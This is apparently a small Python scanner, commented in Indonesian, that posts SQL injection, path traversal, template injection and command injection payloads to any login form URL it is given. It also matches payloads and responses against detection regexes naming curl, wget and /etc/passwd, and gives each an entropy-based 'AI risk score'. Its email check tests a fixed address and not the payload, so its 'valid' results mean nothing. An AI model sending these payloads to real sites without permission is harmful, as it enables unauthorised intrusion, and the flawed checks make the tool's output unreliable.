import re
import requests
import logging
import math
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Setup debug logger
logging.basicConfig(
    filename="debug_scan.log",
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

# Regex untuk validasi email RFC822
RFC822_REGEX = re.compile(
    r"^(?:[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+)*"
    r'|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")'
    r"@(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*)$"
)

# Regex deteksi payload berbahaya
RCE_REGEX = re.compile(r"(?:\b(cat|ls|id|uname|whoami|wget|curl)\b|\;|\|\||`.+?`)", re.IGNORECASE)
LFI_REGEX = re.compile(r"(?:\.\./|\.\.\\|/etc/passwd|boot\.ini|win\.ini)", re.IGNORECASE)
SSTI_REGEX = re.compile(r"(\{\{.*?\}\}|\{\%.*?\%\})", re.IGNORECASE)

def is_rfc822_valid(email):
    return bool(RFC822_REGEX.match(email))

def highlight_match(pattern, text):
    """Highlight semua match dengan warna merah"""
    def replacer(match):
        return Fore.RED + match.group(0) + Style.RESET_ALL
    return pattern.sub(replacer, text)

def detect_and_highlight(payload, name, regex, debug=False):
    if regex.search(payload):
        highlighted = highlight_match(regex, payload)
        print(f"{name} detected in payload: {Fore.RED}YES{Style.RESET_ALL} -> {highlighted}")
        if debug:
            logging.debug(f"[{name}] match found in payload: {payload}")
        return True
    else:
        print(f"{name} detected in payload: {Fore.GREEN}NO{Style.RESET_ALL} -> {payload}")
        if debug:
            logging.debug(f"[{name}] no match in payload: {payload}")
        return False

# AI-lite heuristic scoring
def ai_risk_score(text: str) -> float:
    """
    Skoring heuristik sederhana:
    - panjang string
    - karakter spesial
    - entropi karakter
    """
    if not text:
        return 0.0

    specials = len(re.findall(r"[;|&{}$`<>]", text))
    length_factor = min(len(text) / 50.0, 1.0)
    entropy = 0
    freq = {ch: text.count(ch) for ch in set(text)}
    for c in freq.values():
        p = c / len(text)
        entropy -= p * math.log2(p)

    score = (specials * 0.3) + (length_factor * 0.4) + (entropy * 0.3)
    return round(min(score, 10.0), 2)

def scan_login(url, user_field="username", pass_field="password", output_file="scan_results.txt", debug=False):
    print(f"\n🔍 Scanning login form at {url}\n")
    if debug:
        logging.info(f"Starting scan on {url}")

    test_payloads = [
        "admin' OR 1=1 --",
        "../../etc/passwd",
        "{{7*7}}",
        "uname -a; id"
    ]

    valid_results = []

    for payload in test_payloads:
        print(f"\nTesting payload: {payload}")
        if debug:
            logging.debug(f"Testing payload: {payload}")

        # deteksi di sisi client
        rce = detect_and_highlight(payload, "RCE", RCE_REGEX, debug)
        lfi = detect_and_highlight(payload, "LFI", LFI_REGEX, debug)
        ssti = detect_and_highlight(payload, "SSTI", SSTI_REGEX, debug)

        # skor AI-lite
        risk_score = ai_risk_score(payload)
        print(f"AI Risk Score (payload): {Fore.CYAN}{risk_score}{Style.RESET_ALL}/10")
        if debug:
            logging.debug(f"AI risk score for payload '{payload}': {risk_score}")

        # gabungkan payload dengan email valid
        combined_email = payload + "@abcd.com"
        if is_rfc822_valid("test@abcd.com"):  # pastikan domain valid
            print(f"Email test: {Fore.GREEN}{combined_email}{Style.RESET_ALL} ✅ valid format")
            valid_results.append(combined_email)

        # kirim ke form login
        try:
            resp = requests.post(url, data={user_field: payload, pass_field: "test"})
            body = resp.text[:500]

            # deteksi juga di response
            detect_and_highlight(body, "RCE", RCE_REGEX, debug)
            detect_and_highlight(body, "LFI", LFI_REGEX, debug)
            detect_and_highlight(body, "SSTI", SSTI_REGEX, debug)

            # skor AI-lite untuk response
            resp_score = ai_risk_score(body)
            print(f"AI Risk Score (response): {Fore.MAGENTA}{resp_score}{Style.RESET_ALL}/10")
            if debug:
                logging.debug(f"AI risk score for response (payload '{payload}'): {resp_score}")

        except Exception as e:
            print(f"{Fore.RED}Request error:{Style.RESET_ALL} {e}")
            if debug:
                logging.error(f"Request error for payload '{payload}': {e}")

    # simpan hasil valid ke file txt
    if valid_results:
        with open(output_file, "w") as f:
            for item in valid_results:
                f.write(item + "\n")
        print(f"\n📂 Hasil valid disimpan ke: {Fore.CYAN}{output_file}{Style.RESET_ALL}")
        if debug:
            logging.info(f"Results written to {output_file}")
    else:
        print(Fore.YELLOW + "⚠️ Tidak ada hasil valid yang disimpan." + Style.RESET_ALL)
        if debug:
            logging.warning("No valid results to save.")

if __name__ == "__main__":
    email = input("Enter email address: ").strip()
    if is_rfc822_valid(email):
        print(f"RFC822 valid: {Fore.GREEN}YES{Style.RESET_ALL}")
    else:
        print(f"RFC822 valid: {Fore.RED}NO{Style.RESET_ALL}")

    target_url = input("Enter login form URL (ex: http://127.0.0.1/login): ").strip()
    scan_login(target_url, debug=True)  # aktifkan debug mode default
